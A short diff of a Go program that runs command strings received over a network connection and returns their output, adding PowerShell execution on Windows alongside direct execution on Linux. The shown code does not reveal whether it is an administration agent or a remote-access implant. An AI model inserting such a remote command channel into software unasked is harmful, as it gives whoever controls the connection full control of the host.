@@ -155,8 +155,18 @@ func Heartbeat(conn net.Conn) error {
 }
 
 func executeCommand(conn net.Conn, command string) {
+	var out []byte
+	var err error
+
 	formattedCommand := strings.Fields(command)
-	out, err := exec.Command(formattedCommand[0], formattedCommand[1:]...).Output()
+	switch runtime.GOOS {
+	case "windows":
+		t := []string{"-NoProfile"}
+		t = append(t, formattedCommand...)
+		out, err = exec.Command("powershell", t...).Output()
+	case "linux":
+		out, err = exec.Command(formattedCommand[0], formattedCommand[1:]...).Output()
+	}
 	if err != nil {
 		errorMsg := fmt.Sprintf("%v\n", err)
 		resp := Response{Successful: false, Message: errorMsg}
